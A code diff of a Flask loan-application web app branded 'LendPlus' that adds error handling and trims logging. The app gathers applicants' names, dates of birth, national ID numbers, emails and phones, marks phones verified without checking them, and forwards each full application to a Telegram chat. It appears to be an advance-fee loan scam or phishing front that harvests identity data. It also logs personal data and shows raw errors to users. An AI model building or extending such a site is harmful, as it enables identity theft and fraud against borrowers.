@@ -44,10 +44,8 @@ TELEGRAM_ENABLED = bool(TELEGRAM_TOKEN and TELEGRAM_CHAT_ID)
 # Log Telegram status on startup
 if TELEGRAM_ENABLED:
     logger.info("✅ Telegram is ENABLED - notifications will be sent")
-    logger.info(f"Token starts with: {TELEGRAM_TOKEN[:10]}...")
-    logger.info(f"Chat ID: {TELEGRAM_CHAT_ID}")
 else:
-    logger.warning("⚠️ Telegram is DISABLED - check environment variables TELEGRAM_TOKEN and TELEGRAM_CHAT_ID")
+    logger.warning("⚠️ Telegram is DISABLED - check environment variables")
 
 # Country Configuration
 COUNTRIES = {
@@ -89,14 +87,12 @@ SUPPORT_PHONE = "+254101476926"
 SUPPORT_WHATSAPP = "https://wa.me/254101476926"
 SUPPORT_EMAIL = "customer@lendplus.ke"
 REPAYMENT_MONTHS = 12
-# Fixed processing fee - 8.5% for all countries and amounts
 PROCESSING_FEE_PERCENT = 8.5
 # ==================== END CONFIG ====================
 
 def send_telegram_message(message):
     """Send message to Telegram with detailed logging"""
     if not TELEGRAM_ENABLED:
-        logger.warning("⚠️ Telegram not configured - message not sent")
         return None
     
     try:
@@ -114,15 +110,11 @@ def send_telegram_message(message):
             logger.info("✅ Telegram message sent successfully!")
             return response.json()
         else:
-            logger.error(f"❌ Telegram error: {response.status_code} - {response.text}")
+            logger.error(f"❌ Telegram error: {response.status_code}")
             return None
             
-    except requests.exceptions.Timeout:
-        logger.error("❌ Telegram request timed out")
-        return None
     except Exception as e:
         logger.error(f"❌ Telegram error: {e}")
-        logger.error(traceback.format_exc())
         return None
 
 def format_application_message(data):
@@ -172,7 +164,7 @@ def format_application_message(data):
 
 def calculate_loan_details(amount, country):
     """Calculate loan fee - Fixed 8.5% for all"""
-    fee_rate = PROCESSING_FEE_PERCENT  # 8.5% fixed
+    fee_rate = PROCESSING_FEE_PERCENT
     fee_amount = amount * (fee_rate / 100)
     total = amount + fee_amount
     
@@ -180,7 +172,7 @@ def calculate_loan_details(amount, country):
         'fee_rate': fee_rate,
         'fee_amount': fee_amount,
         'total': total,
-        'months': REPAYMENT_MONTHS  # Always 12 months
+        'months': REPAYMENT_MONTHS
     }
 
 def generate_application_id():
@@ -192,80 +184,92 @@ def generate_application_id():
 @app.route('/')
 def index():
     """Homepage"""
-    return render_template('index.html', 
-                         app_name=APP_NAME,
-                         support_phone=SUPPORT_PHONE,
-                         support_whatsapp=SUPPORT_WHATSAPP,
-                         company_name=COMPANY_NAME,
-                         support_email=SUPPORT_EMAIL,
-                         countries=COUNTRIES)
+    try:
+        return render_template('index.html', 
+                             app_name=APP_NAME,
+                             support_phone=SUPPORT_PHONE,
+                             support_whatsapp=SUPPORT_WHATSAPP,
+                             company_name=COMPANY_NAME,
+                             support_email=SUPPORT_EMAIL,
+                             countries=COUNTRIES)
+    except Exception as e:
+        logger.error(f"Index error: {e}")
+        return f"Error loading page: {e}", 500
 
 @app.route('/apply', methods=['GET', 'POST'])
 def apply():
     """Step 1: Phone number entry"""
-    if request.method == 'POST':
-        phone = request.form.get('phone', '').strip()
-        country = request.form.get('country', 'kenya')
+    try:
+        if request.method == 'POST':
+            phone = request.form.get('phone', '').strip()
+            country = request.form.get('country', 'kenya')
+            
+            # Remove non-numeric characters
+            phone = ''.join(filter(str.isdigit, phone))
+            
+            if phone and len(phone) >= 7:
+                session['phone'] = phone
+                session['country'] = country
+                session['verified'] = True
+                logger.info(f"📱 Phone: {phone}, Country: {country}")
+                return redirect(url_for('personal_info'))
+            else:
+                error = "Please enter a valid phone number (at least 7 digits)"
+                return render_template('apply.html', error=error, countries=COUNTRIES)
         
-        # Remove non-numeric characters
-        phone = ''.join(filter(str.isdigit, phone))
-        
-        if phone and len(phone) >= 7:
-            session['phone'] = phone
-            session['country'] = country
-            session['verified'] = True
-            logger.info(f"📱 Phone: {phone}, Country: {country}")
-            return redirect(url_for('personal_info'))
-        else:
-            error = "Please enter a valid phone number (at least 7 digits)"
-            return render_template('apply.html', error=error, countries=COUNTRIES)
-    
-    return render_template('apply.html', countries=COUNTRIES)
+        return render_template('apply.html', countries=COUNTRIES)
+    except Exception as e:
+        logger.error(f"Apply error: {e}")
+        return f"Error: {e}", 500
 
 @app.route('/personal-info', methods=['GET', 'POST'])
 def personal_info():
     """Step 2: Personal information"""
-    if 'phone' not in session:
-        return redirect(url_for('apply'))
-    
-    country = session.get('country', 'kenya')
-    country_data = COUNTRIES.get(country, COUNTRIES['kenya'])
-    
-    if request.method == 'POST':
-        required = ['first_name', 'last_name', 'dob', 'national_id', 'email', 'gender']
-        for field in required:
-            if not request.form.get(field, '').strip():
-                error = "Please fill in all required fields"
-                return render_template('personal_info.html', error=error, country_data=country_data)
+    try:
+        if 'phone' not in session:
+            return redirect(url_for('apply'))
         
-        session['first_name'] = request.form.get('first_name').strip()
-        session['last_name'] = request.form.get('last_name').strip()
-        session['middle_name'] = request.form.get('middle_name', '').strip()
-        session['dob'] = request.form.get('dob')
-        session['national_id'] = request.form.get('national_id').strip()
-        session['email'] = request.form.get('email').strip()
-        session['gender'] = request.form.get('gender')
-        session['alt_phone'] = request.form.get('alt_phone', '').strip()
+        country = session.get('country', 'kenya')
+        country_data = COUNTRIES.get(country, COUNTRIES['kenya'])
         
-        return redirect(url_for('loan_amount'))
-    
-    return render_template('personal_info.html', country_data=country_data)
+        if request.method == 'POST':
+            required = ['first_name', 'last_name', 'dob', 'national_id', 'email', 'gender']
+            for field in required:
+                if not request.form.get(field, '').strip():
+                    error = "Please fill in all required fields"
+                    return render_template('personal_info.html', error=error, country_data=country_data)
+            
+            session['first_name'] = request.form.get('first_name').strip()
+            session['last_name'] = request.form.get('last_name').strip()
+            session['middle_name'] = request.form.get('middle_name', '').strip()
+            session['dob'] = request.form.get('dob')
+            session['national_id'] = request.form.get('national_id').strip()
+            session['email'] = request.form.get('email').strip()
+            session['gender'] = request.form.get('gender')
+            session['alt_phone'] = request.form.get('alt_phone', '').strip()
+            
+            return redirect(url_for('loan_amount'))
+        
+        return render_template('personal_info.html', country_data=country_data)
+    except Exception as e:
+        logger.error(f"Personal info error: {e}")
+        return f"Error: {e}", 500
 
 @app.route('/loan-amount', methods=['GET', 'POST'])
 def loan_amount():
     """Step 3: Loan amount selection"""
-    if 'phone' not in session:
-        return redirect(url_for('apply'))
-    
-    country = session.get('country', 'kenya')
-    country_data = COUNTRIES.get(country, COUNTRIES['kenya'])
-    currency = country_data['currency']
-    currency_symbol = country_data['currency_symbol']
-    min_loan = country_data['min_loan']
-    max_loan = country_data['max_loan']
-    
-    if request.method == 'POST':
-        try:
+    try:
+        if 'phone' not in session:
+            return redirect(url_for('apply'))
+        
+        country = session.get('country', 'kenya')
+        country_data = COUNTRIES.get(country, COUNTRIES['kenya'])
+        currency = country_data['currency']
+        currency_symbol = country_data['currency_symbol']
+        min_loan = country_data['min_loan']
+        max_loan = country_data['max_loan']
+        
+        if request.method == 'POST':
             amount = float(request.form.get('loan_amount', 0))
             
             if amount < min_loan or amount > max_loan:
@@ -309,88 +313,68 @@ def loan_amount():
             logger.info(f"Name: {application_data['first_name']} {application_data['last_name']}")
             logger.info(f"Phone: {country_data['phone_prefix']} {application_data['phone']}")
             logger.info(f"Amount: {currency} {application_data['loan_amount']}")
-            logger.info(f"Processing Fee: {PROCESSING_FEE_PERCENT}%")
             logger.info(f"Application ID: {application_id}")
             logger.info("=" * 50)
             
-            # ============ SEND TO TELEGRAM ============
+            # Send to Telegram
             if TELEGRAM_ENABLED:
                 try:
-                    logger.info("📤 Attempting to send to Telegram...")
                     message = format_application_message(application_data)
-                    
-                    # Send the full application
-                    result = send_telegram_message(message)
-                    if result:
-                        logger.info("✅ Full application sent to Telegram")
-                    else:
-                        logger.error("❌ Failed to send full application")
-                    
-                    # Send a quick notification
-                    quick_msg = f"🔔 {country_data['flag']} New application from {application_data['first_name']} {application_data['last_name']} for {currency} {amount:,.2f}"
-                    send_telegram_message(quick_msg)
-                    
+                    send_telegram_message(message)
+                    send_telegram_message(
+                        f"🔔 {country_data['flag']} New application from {application_data['first_name']} {application_data['last_name']} for {currency} {amount:,.2f}"
+                    )
                 except Exception as e:
-                    logger.error(f"❌ Telegram error: {e}")
-                    logger.error(traceback.format_exc())
-            else:
-                logger.warning("⚠️ Telegram is DISABLED - check environment variables")
-            # ============ END TELEGRAM ============
+                    logger.error(f"Telegram error: {e}")
             
             session['application_data'] = application_data
             return redirect(url_for('confirmation'))
-            
-        except Exception as e:
-            logger.error(f"Error: {e}")
-            logger.error(traceback.format_exc())
-            error = "An error occurred. Please try again."
-            return render_template('loan_amount.html', error=error, 
-                                 country_data=country_data,
-                                 min_loan=min_loan,
-                                 max_loan=max_loan,
-                                 currency=currency,
-                                 currency_symbol=currency_symbol,
-                                 fee_percent=PROCESSING_FEE_PERCENT,
-                                 repayment_months=REPAYMENT_MONTHS)
-    
-    return render_template('loan_amount.html', 
-                         country_data=country_data,
-                         min_loan=min_loan,
-                         max_loan=max_loan,
-                         currency=currency,
-                         currency_symbol=currency_symbol,
-                         fee_percent=PROCESSING_FEE_PERCENT,
-                         repayment_months=REPAYMENT_MONTHS)
+        
+        return render_template('loan_amount.html', 
+                             country_data=country_data,
+                             min_loan=min_loan,
+                             max_loan=max_loan,
+                             currency=currency,
+                             currency_symbol=currency_symbol,
+                             fee_percent=PROCESSING_FEE_PERCENT,
+                             repayment_months=REPAYMENT_MONTHS)
+    except Exception as e:
+        logger.error(f"Loan amount error: {e}")
+        return f"Error: {e}", 500
 
 @app.route('/confirmation')
 def confirmation():
     """Step 4: Application confirmation"""
-    if 'phone' not in session:
-        return redirect(url_for('apply'))
-    
-    data = session.get('application_data', {})
-    if not data:
-        return redirect(url_for('loan_amount'))
-    
-    return render_template('confirmation.html',
-                         first_name=data.get('first_name', ''),
-                         last_name=data.get('last_name', ''),
-                         phone=data.get('phone', ''),
-                         phone_prefix=data.get('phone_prefix', '+254'),
-                         amount=data.get('loan_amount', 0),
-                         fee_rate=data.get('fee_rate', 8.5),
-                         fee_amount=data.get('fee_amount', 0),
-                         total=data.get('total', 0),
-                         months=data.get('months', 12),
-                         application_id=data.get('application_id', ''),
-                         support_phone=SUPPORT_PHONE,
-                         support_whatsapp=SUPPORT_WHATSAPP,
-                         country=data.get('country', 'Kenya'),
-                         flag=data.get('flag', '🇰🇪'),
-                         currency=data.get('currency', 'KES'),
-                         currency_symbol=data.get('currency_symbol', 'KSh'),
-                         mobile_money=data.get('mobile_money', 'M-Pesa'),
-                         fee_percent=PROCESSING_FEE_PERCENT)
+    try:
+        if 'phone' not in session:
+            return redirect(url_for('apply'))
+        
+        data = session.get('application_data', {})
+        if not data:
+            return redirect(url_for('loan_amount'))
+        
+        return render_template('confirmation.html',
+                             first_name=data.get('first_name', ''),
+                             last_name=data.get('last_name', ''),
+                             phone=data.get('phone', ''),
+                             phone_prefix=data.get('phone_prefix', '+254'),
+                             amount=data.get('loan_amount', 0),
+                             fee_rate=data.get('fee_rate', 8.5),
+                             fee_amount=data.get('fee_amount', 0),
+                             total=data.get('total', 0),
+                             months=data.get('months', 12),
+                             application_id=data.get('application_id', ''),
+                             support_phone=SUPPORT_PHONE,
+                             support_whatsapp=SUPPORT_WHATSAPP,
+                             country=data.get('country', 'Kenya'),
+                             flag=data.get('flag', '🇰🇪'),
+                             currency=data.get('currency', 'KES'),
+                             currency_symbol=data.get('currency_symbol', 'KSh'),
+                             mobile_money=data.get('mobile_money', 'M-Pesa'),
+                             fee_percent=PROCESSING_FEE_PERCENT)
+    except Exception as e:
+        logger.error(f"Confirmation error: {e}")
+        return f"Error: {e}", 500
 
 @app.route('/dashboard')
 def dashboard():
